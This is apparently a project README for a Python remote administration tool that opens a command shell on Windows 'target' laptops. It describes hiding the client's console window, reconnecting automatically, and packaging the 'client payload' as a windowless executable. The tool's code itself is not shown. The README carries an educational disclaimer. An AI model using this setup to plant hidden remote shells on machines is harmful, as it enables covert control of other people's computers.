# OVERIDE
# Simple Python Remote Administration Tool (RAT)

A lightweight, multi-threaded client-server architecture built in Python for executing remote terminal commands over a local network. This tool demonstrates how network sockets, threading, and subprocess pipelines communicate between multiple Windows nodes.

## ⚠️ Educational Disclaimer & Liability
**This project is for educational, research, and authorized testing purposes only.** 
The author of this software assumes absolutely no liability for misuse, damage, or illegal activities conducted with this tool. By downloading, compiling, or running this code, you agree that you are solely responsible for compliance with local and international cyber security laws. Unauthorized deployment on machines you do not own or have explicit written permission to test is strictly prohibited.

---

## Features
* **Multi-Client Handling:** Server uses `threading` to control multiple active laptop sessions simultaneously.
* **Stable Console Pipeline:** Uses the `latin-1` character codec to handle large terminal stream blocks (like `ipconfig` or `systeminfo`) without crashing due to encoding mismatches.
* **Persistent Connection Loops:** The client automatically reconnects every 5 seconds if the server terminal is closed or restarted.
* **Stealth Initialization:** Automatically utilizes Windows API calls (`ctypes`) to hide the default console window wrapper on client execution.

---

## 🛠️ Installation & Setup

### 1. Prerequisites
Ensure you have Python 3.11+ installed on your development machine. Install the required terminal styling package on the host server machine:
```bash
pip install colorama requests
```

### 2. Configure Network IPs
1. Open a terminal on your Server machine and run `ipconfig`. Locate your active Wireless LAN IPv4 Address (e.g., `10.6.49.14`).
2. Open your client script file and update the `SERVER_IP` match variable at the bottom:
   ```python
   if __name__ == '__main__':
       SERVER_IP = "YOUR_SERVER_IP_HERE"
       SERVER_PORT = 5555
   ```

### 3. Open Host Firewall Port (Windows PowerShell)
To allow client laptops to connect to your listening server, open the port by running this command as an Administrator on the server laptop:
```powershell
New-NetFirewallRule -DisplayName "RAT Server Port" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5555
```

---

## 🚀 Execution Guide

### Running via Python
1. Start the listening server first:
   ```bash
   python server.py
   ```
2. Run the script on the client target laptop machine:
   ```bash
   python client.py
   ```

### Compiling Client to Standalone `.exe`
To run the client payload on laptops that do not have Python installed, bundle it into an executable using PyInstaller:
```bash
pip install pyinstaller
pyinstaller --onefile --noconsole client.py
```
Move the compiled binary found inside the generated `dist/` directory onto your target test machine.

---

## 💻 Supported Commands Overview
* `ipconfig` - View network adapter configurations and interface information.
* `ip` - Fetch public IP tracking metadata safely via the integrated HTTPS API handler.Might not work
* `exit` - Terminate the active network session loop cleanly.
* Standard Windows Shell Commands (`whoami`, `dir`, `hostname`, etc.).
